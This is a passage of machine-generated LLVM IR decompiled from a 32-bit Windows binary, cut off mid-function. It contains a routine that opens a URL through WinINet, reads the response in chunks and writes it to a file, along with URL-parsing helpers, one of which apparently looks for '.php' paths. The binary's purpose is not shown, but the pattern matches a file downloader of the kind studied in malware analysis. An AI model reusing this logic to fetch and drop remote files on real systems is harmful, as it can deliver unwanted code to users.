  %stack_var_-10012 = alloca i16*, align 4
  %0 = call i32 @__chkstk(), !insn.addr !5973
  store i16* null, i16** %stack_var_-10012, align 4, !insn.addr !5974
  store i16* null, i16** %stack_var_-10024, align 4, !insn.addr !5975
  %1 = call i32* @InternetOpenW(i16* null, i32 0, i16* null, i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5976
  %2 = icmp eq i32* %1, null, !insn.addr !5977
  br i1 %2, label %dec_label_pc_1000a2ba, label %dec_label_pc_1000a29f, !insn.addr !5978

dec_label_pc_1000a29f:                            ; preds = %dec_label_pc_1000a250
  %3 = ptrtoint i32* %1 to i32, !insn.addr !5976
  store i32 %3, i32* %stack_var_-60, align 4, !insn.addr !5979
  %4 = call i32* @InternetOpenUrlW(i32* nonnull %1, i16* bitcast (i32* @1 to i16*), i16* bitcast (i32* @1 to i16*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5980
  %5 = icmp eq i32* %4, null, !insn.addr !5981
  %6 = icmp eq i1 %5, false, !insn.addr !5982
  br i1 %6, label %dec_label_pc_1000a2cd, label %dec_label_pc_1000a2ba, !insn.addr !5982

dec_label_pc_1000a2ba:                            ; preds = %dec_label_pc_1000a29f, %dec_label_pc_1000a250
  %7 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5983
  ret i32 %7, !insn.addr !5984

dec_label_pc_1000a2cd:                            ; preds = %dec_label_pc_1000a29f
  %8 = ptrtoint i32* %4 to i32, !insn.addr !5980
  %9 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !5979
  %10 = ptrtoint i16** %stack_var_-10012 to i32, !insn.addr !5985
  %11 = ptrtoint i32* %stack_var_-10008 to i32, !insn.addr !5986
  %12 = ptrtoint i16** %stack_var_-10024 to i32
  store i32 %9, i32* %esp.0.reg2mem, !insn.addr !5987
  store i32 0, i32* %stack_var_-10016.0.reg2mem, !insn.addr !5987
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !5987
  br label %dec_label_pc_1000a2d0, !insn.addr !5987

dec_label_pc_1000a2d0:                            ; preds = %dec_label_pc_1000a2d0, %dec_label_pc_1000a2cd
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %stack_var_-10016.0.reload = load i32, i32* %stack_var_-10016.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %13 = add i32 %esp.0.reload, -4, !insn.addr !5985
  %14 = inttoptr i32 %13 to i32*, !insn.addr !5985
  store i32 %10, i32* %14, align 4, !insn.addr !5985
  %15 = add i32 %esp.0.reload, -8, !insn.addr !5988
  %16 = inttoptr i32 %15 to i32*, !insn.addr !5988
  store i32 10000, i32* %16, align 4, !insn.addr !5988
  %17 = add i32 %esp.0.reload, -12, !insn.addr !5986
  %18 = inttoptr i32 %17 to i32*, !insn.addr !5986
  store i32 %11, i32* %18, align 4, !insn.addr !5986
  %19 = add i32 %esp.0.reload, -16, !insn.addr !5989
  %20 = inttoptr i32 %19 to i32*, !insn.addr !5989
  store i32 %8, i32* %20, align 4, !insn.addr !5989
  %21 = load i16*, i16** %stack_var_-10012, align 4, !insn.addr !5990
  %22 = ptrtoint i16* %21 to i32, !insn.addr !5990
  %23 = add i32 %esi.0.reload, %22, !insn.addr !5991
  %24 = add i32 %esp.0.reload, -20, !insn.addr !5992
  %25 = inttoptr i32 %24 to i32*, !insn.addr !5992
  store i32 %23, i32* %25, align 4, !insn.addr !5992
  %26 = call i32 @"??2@YAPAXI@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !5993
  %27 = add i32 %esp.0.reload, -24, !insn.addr !5994
  %28 = inttoptr i32 %27 to i32*, !insn.addr !5994
  store i32 %esi.0.reload, i32* %28, align 4, !insn.addr !5994
  %29 = add i32 %esp.0.reload, -28, !insn.addr !5995
  %30 = inttoptr i32 %29 to i32*, !insn.addr !5995
  store i32 %stack_var_-10016.0.reload, i32* %30, align 4, !insn.addr !5995
  %31 = add i32 %esp.0.reload, -32, !insn.addr !5996
  %32 = inttoptr i32 %31 to i32*, !insn.addr !5996
  store i32 %26, i32* %32, align 4, !insn.addr !5996
  %33 = call i32 @_memcpy.12(), !insn.addr !5997
  %34 = load i16*, i16** %stack_var_-10012, align 4, !insn.addr !5998
  %35 = ptrtoint i16* %34 to i32, !insn.addr !5998
  %36 = add i32 %esp.0.reload, -36, !insn.addr !5998
  %37 = inttoptr i32 %36 to i32*, !insn.addr !5998
  store i32 %35, i32* %37, align 4, !insn.addr !5998
  %38 = add i32 %esp.0.reload, -40, !insn.addr !5999
  %39 = inttoptr i32 %38 to i32*
  store i32 %11, i32* %39, align 4, !insn.addr !5999
  %40 = add i32 %26, %esi.0.reload, !insn.addr !6000
  %41 = add i32 %esp.0.reload, -44, !insn.addr !6001
  %42 = inttoptr i32 %41 to i32*
  store i32 %40, i32* %42, align 4, !insn.addr !6001
  %43 = call i32 @_memcpy.12(), !insn.addr !6002
  store i32 0, i32* %25, align 4, !insn.addr !6003
  store i32 %12, i32* %28, align 4, !insn.addr !6004
  %44 = load i16*, i16** %stack_var_-10012, align 4, !insn.addr !6005
  %45 = ptrtoint i16* %44 to i32, !insn.addr !6005
  store i32 %45, i32* %30, align 4, !insn.addr !6005
  store i32 %11, i32* %32, align 4, !insn.addr !6006
  store i32 0, i32* %37, align 4, !insn.addr !6007
  %46 = call i1 @WriteFile(i32* nonnull @1, i32* nonnull @1, i32 ptrtoint (i32* @1 to i32), i32* nonnull @1, %_OVERLAPPED* bitcast (i32* @1 to %_OVERLAPPED*)), !insn.addr !6008
  store i32 %stack_var_-10016.0.reload, i32* %39, align 4, !insn.addr !6009
  %47 = call i32 @function_1000f4b1(), !insn.addr !6010
  %48 = load i16*, i16** %stack_var_-10012, align 4, !insn.addr !6011
  %49 = ptrtoint i16* %48 to i32, !insn.addr !6011
  %50 = add i32 %esi.0.reload, %49, !insn.addr !6012
  %51 = icmp eq i16* %48, null, !insn.addr !6013
  %52 = icmp eq i1 %51, false, !insn.addr !6014
  store i32 %36, i32* %esp.0.reg2mem, !insn.addr !6014
  store i32 %26, i32* %stack_var_-10016.0.reg2mem, !insn.addr !6014
  store i32 %50, i32* %esi.0.reg2mem, !insn.addr !6014
  br i1 %52, label %dec_label_pc_1000a2d0, label %dec_label_pc_1000a362, !insn.addr !6014

dec_label_pc_1000a362:                            ; preds = %dec_label_pc_1000a2d0
  store i32 %8, i32* %39, align 4, !insn.addr !6015
  store i32 %3, i32* %42, align 4, !insn.addr !6016
  %53 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6017
  ret i32 %53, !insn.addr !6018
}

define i32 @function_1000a390(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a390:
  %esi.3.reg2mem = alloca i32, !insn.addr !6019
  %ecx.1.reg2mem = alloca i32, !insn.addr !6019
  %eax.3.reg2mem = alloca i8, !insn.addr !6019
  %edx.1.reg2mem = alloca i32, !insn.addr !6019
  %edx.0.reg2mem = alloca i32, !insn.addr !6019
  %ecx.0.reg2mem = alloca i32, !insn.addr !6019
  %eax.1.reg2mem = alloca i8, !insn.addr !6019
  %esi.0.reg2mem = alloca i32, !insn.addr !6019
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-1008 = alloca i32, align 4
  br label %dec_label_pc_1000a3c0, !insn.addr !6020

dec_label_pc_1000a3c0:                            ; preds = %dec_label_pc_1000a3c0, %dec_label_pc_1000a390
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %2 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !6021
  %3 = load i8, i8* %2, align 1, !insn.addr !6021
  %4 = add i32 %esi.0.reload, 1, !insn.addr !6022
  %5 = icmp eq i8 %3, 0, !insn.addr !6023
  %6 = icmp eq i1 %5, false, !insn.addr !6024
  store i32 %4, i32* %esi.0.reg2mem, !insn.addr !6024
  br i1 %6, label %dec_label_pc_1000a3c0, label %dec_label_pc_1000a3c7, !insn.addr !6024

dec_label_pc_1000a3c7:                            ; preds = %dec_label_pc_1000a3c0
  %7 = sub i32 1, %1, !insn.addr !6025
  %8 = add i32 %7, %esi.0.reload, !insn.addr !6026
  %9 = inttoptr i32 %1 to i8*, !insn.addr !6027
  %10 = bitcast i32* %stack_var_-1008 to i16*
  %11 = call i32 @_mbstowcs(i16* nonnull %10, i8* %9, i32 %8), !insn.addr !6028
  %12 = call i32 @function_1000a250(), !insn.addr !6029
  %13 = icmp eq i32 %12, 0, !insn.addr !6030
  br i1 %13, label %dec_label_pc_1000a4c8, label %dec_label_pc_1000a3f0, !insn.addr !6031

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3c7
  %14 = inttoptr i32 %12 to i8*, !insn.addr !6032
  %15 = call i8* @StrStrA(i8* %14, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039570, i32 0, i32 0)), !insn.addr !6033
  %16 = icmp eq i8* %15, null, !insn.addr !6034
  br i1 %16, label %dec_label_pc_1000a4c8, label %dec_label_pc_1000a408, !insn.addr !6035

dec_label_pc_1000a408:                            ; preds = %dec_label_pc_1000a3f0
  %17 = ptrtoint i8* %15 to i32, !insn.addr !6033
  %18 = add i32 %17, 2, !insn.addr !6036
  %19 = inttoptr i32 %18 to i8*, !insn.addr !6037
  %20 = call i8* @StrStrA(i8* %19, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_10039574, i32 0, i32 0)), !insn.addr !6038
  %21 = ptrtoint i8* %20 to i32, !insn.addr !6038
  %22 = sub i32 %21, %18, !insn.addr !6039
  %23 = call i32 @_malloc(), !insn.addr !6040
  %24 = inttoptr i32 %23 to i8*, !insn.addr !6041
  %25 = call i8* @_strncpy(i8* %24, i8* %19, i32 %22), !insn.addr !6042
  %26 = add i32 %22, %23, !insn.addr !6043
  %27 = inttoptr i32 %26 to i8*, !insn.addr !6043
  store i8 0, i8* %27, align 1, !insn.addr !6043
  %28 = call i32 @function_100095d0(), !insn.addr !6044
  %29 = inttoptr i32 %28 to i8*, !insn.addr !6045
  %30 = call i8* @StrStrA(i8* %29, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1003954c, i32 0, i32 0)), !insn.addr !6046
  %31 = icmp eq i8* %30, null, !insn.addr !6047
  %32 = add i32 %28, 7
  %spec.select = select i1 %31, i32 %28, i32 %32
  %33 = inttoptr i32 %spec.select to i8*, !insn.addr !6048
  %34 = call i8* @StrStrA(i8* %33, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10039554, i32 0, i32 0)), !insn.addr !6049
  %35 = icmp eq i8* %34, null, !insn.addr !6050
  %36 = add i32 %spec.select, 8
  %esi.2 = select i1 %35, i32 %spec.select, i32 %36
  %37 = inttoptr i32 %esi.2 to i8*, !insn.addr !6051
  %38 = load i8, i8* %37, align 1, !insn.addr !6051
  %39 = icmp eq i8 %38, 47, !insn.addr !6052
  store i32 0, i32* %edx.1.reg2mem, !insn.addr !6053
  br i1 %39, label %dec_label_pc_1000a487, label %dec_label_pc_1000a471, !insn.addr !6053

dec_label_pc_1000a471:                            ; preds = %dec_label_pc_1000a408
  %40 = sub i32 %0, %esi.2, !insn.addr !6054
  store i8 %38, i8* %eax.1.reg2mem, !insn.addr !6054
  store i32 %esi.2, i32* %ecx.0.reg2mem, !insn.addr !6054
  store i32 0, i32* %edx.0.reg2mem, !insn.addr !6054
  br label %dec_label_pc_1000a477, !insn.addr !6054

dec_label_pc_1000a477:                            ; preds = %dec_label_pc_1000a47b, %dec_label_pc_1000a471
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %eax.1.reload = load i8, i8* %eax.1.reg2mem
  %41 = icmp eq i8 %eax.1.reload, 0, !insn.addr !6055
  store i32 %edx.0.reload, i32* %edx.1.reg2mem, !insn.addr !6056
  br i1 %41, label %dec_label_pc_1000a487, label %dec_label_pc_1000a47b, !insn.addr !6056

dec_label_pc_1000a47b:                            ; preds = %dec_label_pc_1000a477
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %42 = add i32 %40, %ecx.0.reload, !insn.addr !6057
  %43 = inttoptr i32 %42 to i8*, !insn.addr !6057
  store i8 %eax.1.reload, i8* %43, align 1, !insn.addr !6057
  %44 = add i32 %edx.0.reload, 1, !insn.addr !6058
  %45 = add i32 %ecx.0.reload, 1, !insn.addr !6059
  %46 = inttoptr i32 %45 to i8*, !insn.addr !6059
  %47 = load i8, i8* %46, align 1, !insn.addr !6059
  %48 = icmp eq i8 %47, 47, !insn.addr !6060
  %49 = icmp eq i1 %48, false, !insn.addr !6061
  store i8 %47, i8* %eax.1.reg2mem, !insn.addr !6061
  store i32 %45, i32* %ecx.0.reg2mem, !insn.addr !6061
  store i32 %44, i32* %edx.0.reg2mem, !insn.addr !6061
  store i32 %44, i32* %edx.1.reg2mem, !insn.addr !6061
  br i1 %49, label %dec_label_pc_1000a477, label %dec_label_pc_1000a487, !insn.addr !6061

dec_label_pc_1000a487:                            ; preds = %dec_label_pc_1000a47b, %dec_label_pc_1000a477, %dec_label_pc_1000a408
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %50 = add i32 %edx.1.reload, %esi.2, !insn.addr !6062
  %51 = add i32 %edx.1.reload, %0, !insn.addr !6063
  %52 = inttoptr i32 %51 to i8*, !insn.addr !6063
  store i8 0, i8* %52, align 1, !insn.addr !6063
  %53 = sub i32 %arg1, %50, !insn.addr !6064
  %54 = inttoptr i32 %50 to i8*, !insn.addr !6065
  %55 = load i8, i8* %54, align 1, !insn.addr !6065
  store i8 %55, i8* %eax.3.reg2mem, !insn.addr !6066
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !6066
  store i32 %50, i32* %esi.3.reg2mem, !insn.addr !6066
  br label %dec_label_pc_1000a4a0, !insn.addr !6066

dec_label_pc_1000a4a0:                            ; preds = %dec_label_pc_1000a4a0, %dec_label_pc_1000a487
  %esi.3.reload = load i32, i32* %esi.3.reg2mem
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %eax.3.reload = load i8, i8* %eax.3.reg2mem
  %56 = add i32 %53, %esi.3.reload, !insn.addr !6067
  %57 = inttoptr i32 %56 to i8*, !insn.addr !6067
  store i8 %eax.3.reload, i8* %57, align 1, !insn.addr !6067
  %58 = add i32 %esi.3.reload, 1, !insn.addr !6068
  %59 = inttoptr i32 %58 to i8*, !insn.addr !6069
  %60 = load i8, i8* %59, align 1, !insn.addr !6069
  %61 = add i32 %ecx.1.reload, 1, !insn.addr !6070
  %62 = icmp eq i8 %60, 0, !insn.addr !6071
  %63 = icmp eq i1 %62, false, !insn.addr !6072
  store i8 %60, i8* %eax.3.reg2mem, !insn.addr !6072
  store i32 %61, i32* %ecx.1.reg2mem, !insn.addr !6072
  store i32 %58, i32* %esi.3.reg2mem, !insn.addr !6072
  br i1 %63, label %dec_label_pc_1000a4a0, label %dec_label_pc_1000a4af, !insn.addr !6072

dec_label_pc_1000a4af:                            ; preds = %dec_label_pc_1000a4a0
  %64 = add i32 %61, %arg1, !insn.addr !6073
  %65 = inttoptr i32 %64 to i8*, !insn.addr !6073
  store i8 %60, i8* %65, align 1, !insn.addr !6073
  %66 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6074
  ret i32 %66, !insn.addr !6075

dec_label_pc_1000a4c8:                            ; preds = %dec_label_pc_1000a3f0, %dec_label_pc_1000a3c7
  %67 = inttoptr i32 %arg2 to i32*, !insn.addr !6076
  store i32 3, i32* %67, align 4, !insn.addr !6076
  %68 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6077
  ret i32 %68, !insn.addr !6078
}

define i32 @function_1000a4e0(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000a4e0:
  %esp.13.reg2mem = alloca i32, !insn.addr !6079
  %esp.1226.reg2mem = alloca i32, !insn.addr !6079
  %.reg2mem = alloca i32, !insn.addr !6079
  %esi.10.reg2mem = alloca i32, !insn.addr !6079
  %eax.7.reg2mem = alloca i32, !insn.addr !6079
  %edx.7.reg2mem = alloca i32, !insn.addr !6079
  %ecx.9.reg2mem = alloca i32, !insn.addr !6079
  %esp.11.reg2mem = alloca i32, !insn.addr !6079
  %esp.10.reg2mem = alloca i32, !insn.addr !6079
  %eax.5.reg2mem = alloca i32, !insn.addr !6079
  %edi.4.reg2mem = alloca i32, !insn.addr !6079
  %esi.9.reg2mem = alloca i32, !insn.addr !6079
  %esp.9.reg2mem = alloca i32, !insn.addr !6079
  %ebx.1.reg2mem = alloca i32, !insn.addr !6079
  %edx.6.reg2mem = alloca i32, !insn.addr !6079
  %ecx.8.reg2mem = alloca i32, !insn.addr !6079
  %esp.8.reg2mem = alloca i32, !insn.addr !6079
  %esi.8.reg2mem = alloca i32, !insn.addr !6079
  %ecx.7.reg2mem = alloca i32, !insn.addr !6079
  %eax.4.reg2mem = alloca i8, !insn.addr !6079
  %edi.3.reg2mem = alloca i32, !insn.addr !6079
  %edx.5.reg2mem = alloca i32, !insn.addr !6079
  %edx.4.reg2mem = alloca i32, !insn.addr !6079
  %edx.3.reg2mem = alloca i32, !insn.addr !6079
  %ecx.6.reg2mem = alloca i32, !insn.addr !6079
  %eax.1.reg2mem = alloca i8, !insn.addr !6079
  %esi.5.reg2mem = alloca i32, !insn.addr !6079
  %esp.7.reg2mem = alloca i32, !insn.addr !6079
  %esi.4.reg2mem = alloca i32, !insn.addr !6079
  %esp.6.reg2mem = alloca i32, !insn.addr !6079
  %esp.5.reg2mem = alloca i32, !insn.addr !6079
  %esp.4.reg2mem = alloca i32, !insn.addr !6079
  %esp.3.reg2mem = alloca i32, !insn.addr !6079
  %eax.0.reg2mem = alloca i32, !insn.addr !6079
  %storemerge.reg2mem = alloca i32, !insn.addr !6079
  %esp.2.reg2mem = alloca i32, !insn.addr !6079
  %ecx.5.reg2mem = alloca i32, !insn.addr !6079
  %esi.3.reg2mem = alloca i32, !insn.addr !6079
  %esp.0.reg2mem = alloca i32, !insn.addr !6079
  %ecx.3.reg2mem = alloca i32, !insn.addr !6079
  %esi.2.reg2mem = alloca i32, !insn.addr !6079
  %ebx.0.reg2mem = alloca i32, !insn.addr !6079
  %ecx.2.reg2mem = alloca i32, !insn.addr !6079
  %esi.1.reg2mem = alloca i32, !insn.addr !6079
  %edx.1.reg2mem = alloca i32, !insn.addr !6079
  %ecx.1.reg2mem = alloca i32, !insn.addr !6079
  %esi.0.reg2mem = alloca i32, !insn.addr !6079
  %edx.0.reg2mem = alloca i32, !insn.addr !6079
  %ecx.0.reg2mem = alloca i32, !insn.addr !6079
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-182132 = alloca i32, align 4
  %stack_var_-41172 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-1172 = alloca i32, align 4
  %stack_var_-48 = alloca i8*, align 4
  %2 = call i128 @__decompiler_undefined_function_3()
  %3 = call i128 @__decompiler_undefined_function_3()
  %4 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-140 = alloca i128, align 8
  %5 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-172 = alloca i128, align 8
  %6 = call i128 @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %7 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !6080
  %8 = call i32 @__chkstk(), !insn.addr !6081
  store i8* inttoptr (i32 503000 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6082
  %9 = call i32* @LocalAlloc(i32 %arg1, i32 %0), !insn.addr !6083
  %10 = load i128, i128* @global_var_10039a30, align 4, !insn.addr !6084
  %11 = call i128 @__asm_movaps(i128 %10), !insn.addr !6084
  call void @__asm_movups(i128 %6, i128 %11), !insn.addr !6085
  %12 = load i128, i128* @global_var_100399c0, align 4, !insn.addr !6086
  %13 = call i128 @__asm_movaps(i128 %12), !insn.addr !6086
  call void @__asm_movups(i128 %5, i128 %13), !insn.addr !6087
  %14 = load i128, i128* @global_var_10039c80, align 4, !insn.addr !6088
  %15 = call i128 @__asm_movaps(i128 %14), !insn.addr !6088
  call void @__asm_movups(i128 %4, i128 %15), !insn.addr !6089
  %16 = load i128, i128* @global_var_10039b10, align 4, !insn.addr !6090
  %17 = call i128 @__asm_movaps(i128 %16), !insn.addr !6090
  call void @__asm_movups(i128 %3, i128 %17), !insn.addr !6091
  %18 = load i128, i128* @global_var_10039c50, align 4, !insn.addr !6092
  %19 = call i128 @__asm_movaps(i128 %18), !insn.addr !6092
  call void @__asm_movups(i128 %2, i128 %19), !insn.addr !6093
  store i32 1414745936, i32* %stack_var_-32, align 4, !insn.addr !6094
  %20 = call i32 @WaitForSingleObject(i32* inttoptr (i32 1414745936 to i32*), i32 32), !insn.addr !6095
  %21 = load i32, i32* inttoptr (i32 268620228 to i32*), align 4, !insn.addr !6096
  %22 = inttoptr i32 %1 to i8*, !insn.addr !6097
  %23 = call i8* @StrStrIA(i8* %22, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1003954c, i32 0, i32 0)), !insn.addr !6098
  %24 = icmp eq i8* %23, null, !insn.addr !6099
  %25 = add i32 %1, 7
  %spec.select = select i1 %24, i32 %1, i32 %25
  %26 = inttoptr i32 %spec.select to i8*, !insn.addr !6100
  store i8* %26, i8** %stack_var_-48, align 4, !insn.addr !6100
  %27 = call i8* @StrStrIA(i8* %26, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10039554, i32 0, i32 0)), !insn.addr !6101
  %28 = icmp eq i8* %27, null, !insn.addr !6102
  %29 = add i32 %spec.select, 8
  %edi.1 = select i1 %28, i32 %spec.select, i32 %29
  %30 = inttoptr i32 %edi.1 to i8*, !insn.addr !6103
  %31 = load i8, i8* %30, align 1, !insn.addr !6103
  %32 = zext i8 %31 to i32, !insn.addr !6103
  %33 = and i32 %1, -256, !insn.addr !6103
  %34 = or i32 %33, %32, !insn.addr !6103
  %35 = icmp slt i8 %31, 1
  store i32 %34, i32* %ecx.2.reg2mem, !insn.addr !6104
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !6104
  store i32 0, i32* %esi.2.reg2mem, !insn.addr !6104
  br i1 %35, label %dec_label_pc_1000a5f6, label %dec_label_pc_1000a5c2, !insn.addr !6104

dec_label_pc_1000a5c2:                            ; preds = %dec_label_pc_1000a4e0
  %36 = ptrtoint i8** %stack_var_-48 to i32, !insn.addr !6100
  %37 = ptrtoint i32* %stack_var_-1172 to i32, !insn.addr !6105
  %38 = sub i32 %37, %edi.1, !insn.addr !6106
  store i32 %34, i32* %ecx.0.reg2mem, !insn.addr !6107
  store i32 %edi.1, i32* %edx.0.reg2mem, !insn.addr !6107
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !6107
  br label %dec_label_pc_1000a5d0, !insn.addr !6107

dec_label_pc_1000a5d0:                            ; preds = %dec_label_pc_1000a5d5, %dec_label_pc_1000a5c2
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %39 = trunc i32 %ecx.0.reload to i8, !insn.addr !6108
  %40 = icmp eq i8 %39, 47, !insn.addr !6108
  store i32 %ecx.0.reload, i32* %ecx.1.reg2mem, !insn.addr !6109
  store i32 %edx.0.reload, i32* %edx.1.reg2mem, !insn.addr !6109
  store i32 %esi.0.reload, i32* %esi.1.reg2mem, !insn.addr !6109
  br i1 %40, label %dec_label_pc_1000a5e4, label %dec_label_pc_1000a5d5, !insn.addr !6109

dec_label_pc_1000a5d5:                            ; preds = %dec_label_pc_1000a5d0
  %41 = add i32 %38, %edx.0.reload, !insn.addr !6110
  %42 = inttoptr i32 %41 to i8*, !insn.addr !6110
  store i8 %39, i8* %42, align 1, !insn.addr !6110
  %43 = add nuw nsw i32 %esi.0.reload, 1, !insn.addr !6111
  %44 = add i32 %edx.0.reload, 1, !insn.addr !6112
  %45 = inttoptr i32 %44 to i8*, !insn.addr !6112
  %46 = load i8, i8* %45, align 1, !insn.addr !6112
  %47 = zext i8 %46 to i32, !insn.addr !6112
  %48 = and i32 %ecx.0.reload, -256, !insn.addr !6112
  %49 = or i32 %48, %47, !insn.addr !6112
  %50 = sext i8 %46 to i32, !insn.addr !6113
  %51 = icmp slt i32 %43, %50, !insn.addr !6114
  store i32 %49, i32* %ecx.0.reg2mem, !insn.addr !6114
  store i32 %44, i32* %edx.0.reg2mem, !insn.addr !6114
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !6114
  store i32 %49, i32* %ecx.1.reg2mem, !insn.addr !6114
  store i32 %44, i32* %edx.1.reg2mem, !insn.addr !6114
  store i32 %43, i32* %esi.1.reg2mem, !insn.addr !6114
  br i1 %51, label %dec_label_pc_1000a5d0, label %dec_label_pc_1000a5e4, !insn.addr !6114

dec_label_pc_1000a5e4:                            ; preds = %dec_label_pc_1000a5d5, %dec_label_pc_1000a5d0
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %52 = load i32, i32* inttoptr (i32 268620228 to i32*), align 4, !insn.addr !6115
  %53 = icmp ult i32 %esi.1.reload, 1000, !insn.addr !6116
  %54 = icmp eq i1 %53, false, !insn.addr !6117
  store i32 %ecx.1.reload, i32* %ecx.2.reg2mem, !insn.addr !6117
  store i32 %52, i32* %ebx.0.reg2mem, !insn.addr !6117
  store i32 %esi.1.reload, i32* %esi.2.reg2mem, !insn.addr !6117
  store i32 %ecx.1.reload, i32* %ecx.8.reg2mem, !insn.addr !6117
  store i32 %edx.1.reload, i32* %edx.6.reg2mem, !insn.addr !6117
  store i32 %52, i32* %ebx.1.reg2mem, !insn.addr !6117
  store i32 %36, i32* %esp.9.reg2mem, !insn.addr !6117
  store i32 %esi.1.reload, i32* %esi.9.reg2mem, !insn.addr !6117
  store i32 %edi.1, i32* %edi.4.reg2mem, !insn.addr !6117
  br i1 %54, label %dec_label_pc_1000aaf1, label %dec_label_pc_1000a5f6, !insn.addr !6117

dec_label_pc_1000a5f6:                            ; preds = %dec_label_pc_1000a5e4, %dec_label_pc_1000a4e0
  %esi.2.reload = load i32, i32* %esi.2.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %55 = add i32 %7, -1168, !insn.addr !6118
  %56 = add i32 %55, %esi.2.reload, !insn.addr !6118
  %57 = inttoptr i32 %56 to i8*, !insn.addr !6118
  store i8 0, i8* %57, align 1, !insn.addr !6118
  %58 = bitcast i128* %stack_var_-140 to i8*
  %59 = add i32 %esi.2.reload, %edi.1, !insn.addr !6119
  %60 = call i32 @lstrlenA(i8* nonnull %58), !insn.addr !6120
  store i32 %59, i32* %stack_var_-56, align 4, !insn.addr !6121
  %61 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !6121
  %62 = inttoptr i32 %60 to i8*, !insn.addr !6122
  %63 = call i32 @lstrlenA(i8* %62), !insn.addr !6122
  %64 = icmp slt i32 %63, 1
  store i32 %ecx.2.reload, i32* %ecx.5.reg2mem, !insn.addr !6123
  store i32 %61, i32* %esp.2.reg2mem, !insn.addr !6123
  store i32 %arg1, i32* %storemerge.reg2mem, !insn.addr !6123
  br i1 %64, label %dec_label_pc_1000a6c8, label %dec_label_pc_1000a624, !insn.addr !6123

dec_label_pc_1000a624:                            ; preds = %dec_label_pc_1000a5f6
  %65 = ptrtoint i32* %stack_var_-41172 to i32, !insn.addr !6124
  %66 = sub i32 %65, %59, !insn.addr !6125
  store i32 %ecx.2.reload, i32* %ecx.3.reg2mem, !insn.addr !6126
  store i32 %61, i32* %esp.0.reg2mem, !insn.addr !6126
  store i32 0, i32* %esi.3.reg2mem, !insn.addr !6126
  br label %dec_label_pc_1000a632, !insn.addr !6126

dec_label_pc_1000a632:                            ; preds = %dec_label_pc_1000a652, %dec_label_pc_1000a624
  %esi.3.reload = load i32, i32* %esi.3.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %67 = add i32 %esi.3.reload, %59
  %68 = inttoptr i32 %67 to i8*, !insn.addr !6127
  %69 = load i8, i8* %68, align 1, !insn.addr !6127
  %70 = zext i8 %69 to i32, !insn.addr !6127
  %71 = and i32 %ecx.3.reload, -256, !insn.addr !6127
  %72 = or i32 %71, %70, !insn.addr !6127
  %73 = icmp eq i8 %69, 46, !insn.addr !6128
  %74 = icmp eq i1 %73, false, !insn.addr !6129
  br i1 %74, label %dec_label_pc_1000a652, label %dec_label_pc_1000a63d, !insn.addr !6129

dec_label_pc_1000a63d:                            ; preds = %dec_label_pc_1000a632
  %75 = add i32 %67, 1, !insn.addr !6130
  %76 = inttoptr i32 %75 to i8*
  %77 = load i8, i8* %76, align 1, !insn.addr !6130
  %78 = icmp eq i8 %77, 112, !insn.addr !6130
  %79 = icmp eq i1 %78, false, !insn.addr !6131
  br i1 %79, label %dec_label_pc_1000a652, label %dec_label_pc_1000a644, !insn.addr !6131

dec_label_pc_1000a644:                            ; preds = %dec_label_pc_1000a63d
  %80 = add i32 %67, 2, !insn.addr !6132
  %81 = inttoptr i32 %80 to i8*
  %82 = load i8, i8* %81, align 1, !insn.addr !6132
  %83 = icmp eq i8 %82, 104, !insn.addr !6132
  %84 = icmp eq i1 %83, false, !insn.addr !6133
